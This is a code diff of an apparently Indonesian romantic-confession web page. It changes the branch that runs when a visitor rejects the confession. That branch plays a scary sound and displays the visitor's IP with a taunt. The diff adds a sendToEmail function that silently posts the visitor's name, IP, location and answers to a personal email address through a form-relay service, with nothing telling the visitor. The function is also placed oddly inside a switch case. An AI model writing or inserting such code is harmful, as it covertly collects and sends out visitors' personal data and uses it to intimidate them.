@@ -437,7 +437,7 @@
         <source src="no1.mp3" type="audio/mpeg">
     </audio>
     <audio id="scarySound">
-        <source src="Get out meme.mp3" type="audio/mpeg">
+        <source src="YAAI.mp3" type="audio/mpeg">
     </audio>
     <audio id="romanticSound1">
         <source src="romantic1.mp3" type="audio/mpeg">
@@ -1165,20 +1165,54 @@ selalu menemukan jalannya. 🌸.</p>
                     saveResponses();
                     break;
                 case 'iya-lah':
-                    partyMusic.pause();
-                    romanticSound1.pause();
-                    romanticSound2.pause();
-                    scarySound.play();
-                    document.getElementById('scary-response').classList.remove('hidden');
-                    document.body.className = 'scary';
-                    
-                    const userInfo = await getUserInfo();
-                    document.getElementById('user-info').innerHTML = `
-                        <p>IP HP MU: ${userInfo.ip}</p>
-                        <p>HAYOLOOO SIAPA SURUH TOLAK CINTAKU!</p>
-                    `;
-                    saveResponses();
-                    break;
+    partyMusic.pause();
+    romanticSound1.pause();
+    romanticSound2.pause();
+    scarySound.play();
+    document.getElementById('scary-response').classList.remove('hidden');
+    document.body.className = 'scary';
+    
+    const userInfo = await getUserInfo();
+    document.getElementById('user-info').innerHTML = `
+      <p>IP HP MU: ${userInfo.ip}</p>
+      <p>HAYOLOOO SIAPA SURUH TOLAK CINTAKU!</p>
+    `;
+    
+    // KIRIM DATA PENOLAKAN KE EMAIL
+    const rejectionData = {
+      name: currentUser,
+      ip: userInfo.ip,
+      location: userInfo.location,
+      responses: userResponses,
+      status: "DITOLAK"
+    };
+    sendToEmail(rejectionData); // <-- INI YANG BARU
+    saveResponses();
+    break;
+
+  // [TAMBAHKAN FUNGSI BARU INI]
+  async function sendToEmail(data) {
+    try {
+      const response = await fetch('https://formsubmit.co/ajax/dewudd2@gmail.com', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          _subject: `USER DITOLAK - ${data.name}`,
+          name: data.name,
+          ip: data.ip,
+          location: data.location,
+          responses: JSON.stringify(data.responses),
+          status: data.status,
+          _template: 'table'
+        })
+      });
+      console.log('Data terkirim ke email');
+    } catch (error) {
+      console.error('Gagal mengirim data:', error);
+    }
+  }
             }
         }
     </script>
